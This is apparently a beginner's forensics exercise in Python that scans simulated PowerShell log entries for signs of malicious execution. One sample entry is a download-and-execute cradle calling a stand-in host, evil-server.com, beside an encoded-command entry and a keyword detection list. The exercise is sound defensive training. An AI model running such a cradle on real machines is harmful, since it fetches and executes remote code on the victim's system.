# ==========================================
# Day 65: PowerShell History & Script Block Forensic Parser
# Purpose: Practice digital forensics and detection of malicious PowerShell execution telemetry
# ==========================================

print("=== POWERSHELL FORENSIC ARTIFACT PARSER ===")

# Simulated PowerShell history and script block log entries extracted from a workstation
powershell_logs = [
    {
        "timestamp": "2026-09-21 09:30:12",
        "user": "admin_alice",
        "command": "Get-Process | Where-Object {$_.CPU -gt 50}"
    },
    {
        "timestamp": "2026-09-21 10:15:45",
        "user": "contractor_bob",
        "command": "iex (New-Object Net.WebClient).DownloadString('http://evil-server.com/payload.ps1')"
    },
    {
        "timestamp": "2026-09-21 10:16:02",
        "user": "contractor_bob",
        "command": "powershell -EncodedCommand JABhADescapeAEMAbwBkAGUAUwB0AHIAaQBuAGcA..."
    },
    {
        "timestamp": "2026-09-21 11:00:20",
        "user": "admin_alice",
        "command": "Get-Service | Where-Object Status -eq 'Running'"
    }
]

# Known malicious PowerShell patterns and keywords
suspicious_indicators = ["downloadstring", "iex", "-encodedcommand", "invoke-expression", "bypass"]

def parse_powershell_logs(logs):
    print("[*] Parsing PowerShell execution history and script block logs for indicators...\n")
    forensic_alerts = 0
    
    for log in logs:
        time = log["timestamp"]
        user = log["user"]
        cmd = log["command"]
        cmd_lower = cmd.lower()
        
        # Check if command contains any known malicious indicators
        matched_indicators = [ind for ind in suspicious_indicators if ind in cmd_lower]
        
        if matched_indicators:
            forensic_alerts += 1
            print(f"  🚨 [FORENSIC ALERT]: Suspicious PowerShell execution detected!")
            print(f"     ├─ Timestamp: {time}")
            print(f"     ├─ User Profile: {user}")
            print(f"     ├─ Command Executed: {cmd}")
            print(f"     └─ Matched Indicators: {matched_indicators}\n")
        else:
            print(f"  ✅ [NORMAL]: User '{user}' executed safe command.")
            
    return forensic_alerts

# Run the PowerShell forensic analysis
total_alerts = parse_powershell_logs(powershell_logs)

print("--- POWERSHELL FORENSICS SUMMARY ---")
if total_alerts > 0:
    print(f"  ⚠️ [INCIDENT DETECTED]: Flagged {total_alerts} malicious PowerShell execution artifact(s)!")
    print(f"     └─ Action Required: Review full script block logs and trace user session activities.")
else:
    print("  ✅ [SECURE]: All PowerShell command histories verified clean.")

print("==========================================")